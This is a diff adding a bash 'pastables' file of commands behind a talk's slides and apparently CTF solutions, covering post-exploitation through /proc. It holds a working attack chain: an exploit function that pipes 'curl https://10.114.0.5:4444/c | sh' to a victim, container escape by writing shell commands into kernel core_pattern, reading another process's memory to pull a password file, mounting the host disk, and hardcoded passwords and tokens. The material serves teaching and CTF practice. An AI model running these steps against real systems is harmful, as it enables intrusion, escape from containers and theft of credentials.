@@ -1,0 +1,230 @@
+#!/bin/bash
+#
+# pastables
+# Commands run to make slides, also (kinda) CTF solutions.  GLHF
+# By J. Stuart McMurray
+# Created 20251204
+# Last Modified 20251206
+
+# Prep: Victim
+echo core | sudo tee /proc/sys/kernel/core_pattern
+# Prep: Debian
+sudo umount /root/.m
+sudo rmdir /root/.m
+sudo rm -vf /root/.d
+# Prep: Ops
+rm -vf ~/crs/ctrl-i/net.subr
+
+# Curlrevshell-001
+curlrevshell -ctrl-i ~/crs/ctrl-i/ -log ~/crs/log.json
+# To Ops-002
+# Curlrevshell-003
+ps awwwfux
+# To Debian-004
+# Curlrevshell-009
+ls /proc
+type ls echo
+echo /proc/*
+ls -l /proc/*/exe
+for i in /proc/*/comm; do
+        echo -E "$i - $(<$i)"
+done
+# tab
+_cat /proc/$$/comm
+_cat /proc/$$/cmdline
+_cat0 /proc/$$/cmdline
+_ps
+tab_list
+_cat /proc/$$/status
+_cat /proc/$$/stat
+read -r -a STAT </proc/$$/stat
+echo "Len: ${#STAT[@]}"
+echo "Environ: ${STAT[49]}-${STAT[50]}"
+# PID of cicd
+_cat0 /proc/7/environ
+ls -l /proc/7/exe
+type openssl base64
+openssl base64 -e </proc/7/exe | wc -l
+ls -l /proc/7/fd
+# FD of /tmp/debug.out
+_cat /proc/7/fd/8
+_cat /proc/net/dev
+_cat /sys/class/net/eth0/ifindex
+_cat /sys/class/net/eth0/iflink
+_cat /proc/net/arp
+_cat /proc/net/fib_trie
+# To Ops-010
+# Curlrevshell-011
+# tab
+tab_list
+_ipaddrs
+_cat /proc/net/tcp
+echo $((0x115C))
+# Last octet from TCP table
+echo $((0xAC)).$((0x12)).$((0x00)).$((0x04)) $((0x044B))
+# Address from echo
+exec 4<>/dev/tcp/172.18.0.4/1099
+ls -l /proc/$$/fd/4
+_cat /proc/net/tcp
+cat <&4 &
+cat >&4
+# Password from src/flags.m4/flags.m4
+CloudLoggerDebugPassword_0b9a97a4-5bf3-422c-8299-7b52383da214
+ps awwwfux
+# tab
+_ps
+_cat /proc/$$/status
+_cat /proc/partitions
+# To Debian-012
+# Curlrevshell-013
+type mknod mount perl python
+_cat /proc/sys/kernel/core_pattern
+echo *
+/sh -c 'kill -SEGV $$'
+echo *
+# To Debian-014
+# Curlrevshell-015
+pwd
+# Core filename from echo *
+echo '|/bin/sh -c id>/proc/%P/root/core.16' >/proc/sys/kernel/core_pattern
+_cat /proc/sys/kernel/core_pattern
+/sh -c 'kill -SEGV $$'
+_cat core.16
+echo '|/bin/sh -c ps${IFS}awwwfux>/proc/%P/root/core.16' >/proc/sys/kernel/core_pattern
+/sh -c 'kill -SEGV $$'; _cat core.16
+echo '|/bin/sh -c ls${IFS}-l${IFS}/proc/%P/fd>/proc/%P/root/core.16' >/proc/sys/kernel/core_pattern
+/sh -c 'kill -SEGV $$'; _cat core.16
+echo '|/bin/sh -c cd${IFS}/proc/%P/fd;ls${IFS}-l${IFS}>1' >/proc/sys/kernel/core_pattern
+/sh -c 'kill -SEGV $$'
+echo '|/bin/bash' \
+'-c' \
+'eval${IFS}`printf${IFS}"cd\x20/proc/%P/fd;exec\x20-anot-h4x\x20bash\x204>&0\x20<0\x20>1\x202>2"`' \
+>/proc/sys/kernel/core_pattern
+_cat /proc/sys/kernel/core_pattern
+/sh -c 'kill -SEGV $$'
+ps awwwfux
+( exec -a '' ps awwwfux )
+echo 'core' >/proc/sys/kernel/core_pattern
+_cat /proc/sys/kernel/core_pattern
+# tab
+_cat /proc/sys/kernel/core_pattern
+_cat /proc/net/dev
+_cat /sys/class/net/eth0/ifindex
+_cat /sys/class/net/eth0/iflink
+# iflink number from earlier eth0
+for f in /sys/class/net/*/ifindex; do
+        if [[ 2386 == "$(<"$f")" ]]; then
+                echo "$f"
+                break
+        fi
+done
+# passwordstore's pid
+ls -l /proc/2758289/cwd
+ls -l /build
+cd /proc/2758289/cwd
+echo *
+_cat key_file
+_cat passwordstore.c
+while read -r; do
+        if [[ "$REPLY" == *munmap* ]]; then
+                echo "$REPLY"
+        fi
+done <passwordstore.c
+_cat /proc/2758289/maps
+# Start of range of /build/password_file
+dd \
+        if=/proc/2758289/mem \
+        bs=$((0x1000)) \
+        count=1 \
+        skip=$((0x7ff2c77ca)) \
+        status=none
+# goto out!
+
+# Ops-002
+function exploit { echo -E "$1" | curl -skT- -u :a58eba7e-e417-4d69-9c82-82ac44715644 --expect100-timeout 0.1 --pinnedpubkey sha256//wakmKebY6t37adDt0bnAGgDGD7bZ7KnCz/WzIfKIP68= https://victim; }
+exploit 'curl \
+        -sk \
+        --pinnedpubkey sha256//xTTVmYL39kmep6AbYey/IJMRA114Z5FAJf7oW52LB7w= \
+        https://10.114.0.5:4444/c |
+        sh'
+# To Curlrevshell-003
+# Ops-005
+ktrace -i bash -c 'ps awwwfux; exec -a "" ps awwfux' >/dev/null
+kdump -tx
+# To Debian-006
+# Ops-007
+curl -si http://debian:8000/home/stuart/example_file
+curl -si http://debian:8000/proc/partitions
+# To Debian-008
+# Ops-010
+cp -v ~/crs/net.subr ~/crs/ctrl-i/net.subr
+# To Curlrevshell-011
+
+# Debian-004
+ps awwwfux
+mount
+ls /proc
+apropos proc
+echo hello >./example_file
+strace cat ./example_file >/dev/null
+strace sh -c 'echo hello >./example_file'
+strace cat /proc/version >/dev/null
+ls /proc/$$
+ls -l /proc/self
+ls -l /proc/net
+ls /proc/net
+ls /proc/sys
+sudo su -
+. ~stuart/.bashrc
+id
+exec 3>>/bin/id
+ls -l /proc/$$/fd/3
+id
+exec 3>&-
+id
+exit
+strace -f bash -c 'ps awwwfux; exec -a "" ps awwfux' 2>&1 >/dev/null | egrep 'execve\('
+# To Ops-005
+# Debian-006
+ls -l /proc/$$/
+python3 -m http.server --directory /
+# To Ops-007
+# Debian-008
+# ctrl+c
+cat /proc/partitions
+cat </proc/partitions
+echo -E "$(</proc/partitions)"
+type cat echo
+cat </proc/self/comm
+sh -c 'cat </proc/self/comm'
+cat </proc/$$/comm
+echo systemd-shelld >/proc/$$/comm
+echo -E "$(</proc/$$/comm)"
+echo -E "$(</proc/$$/environ)"
+hexdump -C </proc/$$/environ
+while read -d '' -r -t 4; do
+        echo -E "$REPLY"
+done </proc/$$/environ
+# Curlrevshell-009
+# Debian-012
+sudo su -
+. ~stuart/.bashrc
+cat </proc/partitions
+mknod --help | head -n 1
+mknod /root/.d b 254 1
+ls -l /root/.d /dev/vda1
+mkdir -v /root/.m
+mount -v /root/.d /root/.m
+ls /root/.m
+cat </root/.m/etc/crontab
+exit
+# To Curlrevshell-013
+# Debian-014
+cd 
+ls -l /proc/$$/root
+ls -l /proc/$$/root/
+cd /proc/$$/root/
+ls 
+# To Curlrevshell-015
+
+# vim: ft=sh cc= nonu
